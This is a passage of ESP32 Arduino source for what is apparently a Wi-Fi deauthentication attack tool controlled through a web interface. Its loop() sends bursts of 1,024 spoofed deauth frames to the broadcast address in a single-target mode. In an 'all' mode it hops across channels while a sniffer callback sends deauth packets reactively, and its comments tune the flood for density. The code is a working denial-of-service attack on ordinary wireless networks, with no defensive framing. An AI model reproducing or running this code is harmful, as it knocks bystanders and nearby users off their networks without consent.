  DEBUG_PRINT("Access Point ");
  DEBUG_PRINT(AP_SSID);
  DEBUG_PRINTLN(" started");
  DEBUG_PRINT("IP address: ");
  DEBUG_PRINTLN(WiFi.softAPIP());
#endif


  // Start the web interface
  start_web_interface();

  // Initialize deauth_type to a non-attack state
  deauth_type = -1;

  // Perform an initial scan so the table isn't empty on first load
  // Ensure STA mode for scanning first
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  delay(100);
  DEBUG_PRINTLN("Initial scan...");
  num_networks = WiFi.scanNetworks(); // Synchronous scan
  DEBUG_PRINTF("Initial scan found %d networks\n", num_networks);

  // Switch back to AP mode for web interface after initial scan
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(AP_SSID, AP_PASS);

}

// Standard Arduino loop function - runs continuously
void loop() {
    // --- NEW: Always handle web clients to keep UI responsive (if stable) ---
    web_interface_handle_client();
    // --- END NEW ---

    unsigned long currentTime = millis();

    if (deauth_type == DEAUTH_TYPE_SINGLE) {
        // Handle single target deauth (broadcast flood)
        // Check if the interval has passed (always true if interval is 0)
        if (currentTime - lastDeauthBurstTime >= DEAUTH_ATTACK_INTERVAL_MS) {
            // Send bursts of deauth frames periodically/continuously
            for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
                // WIFI_IF_AP interface is used in single mode where we spoof the target AP
                esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
                // No delay/yield here to maximize continuous sending attempt within the burst loop
            }
            // DEBUG_PRINTF is blocking, avoid in fast loops
            // DEBUG_PRINTF("Send %d Deauth-Frames to: FF:FF:FF:FF:FF:FF (SINGLE TARGET)\n", NUM_FRAMES_PER_DEAUTH);
            BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION); // LED blink is ok, uses delay but short

            lastDeauthBurstTime = currentTime; // Update last action time
        }
        // No delay here! Loop must continue to handle web clients and other tasks.

    } else if (deauth_type == DEAUTH_TYPE_ALL) {
        // Handle channel hopping for all stations attack
        if (currentTime - lastChannelHopTime >= CHANNEL_HOP_INTERVAL_MS) {
             if (curr_channel > CHANNEL_MAX) curr_channel = 1; // Wrap around channels
             // DEBUG_PRINTF is blocking, avoid in fast loops
             // DEBUG_PRINT("Hopping to channel: ");
             // DEBUG_PRINTLN(curr_channel);
             esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE); // Set the Wi-Fi channel
             curr_channel++; // Move to the next channel
             // In DEAUTH_TYPE_ALL, the sniffer callback handles sending packets reactively.
             BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION); // LED blink is ok here too

             lastChannelHopTime = currentTime; // Update last action time
        }
        // No delay here! Loop must continue to handle web clients and other tasks.
    }

    // With NUM_FRAMES_PER_DEAUTH at 1024 and interval 0, the loop can still block significantly
    // while sending the burst. If WDT resets occur, you might need to uncomment the yield below,
    // but this slightly reduces the *density* of the burst.
    // delay(0); // or vTaskDelay(1); require FreeRTOS includes

}
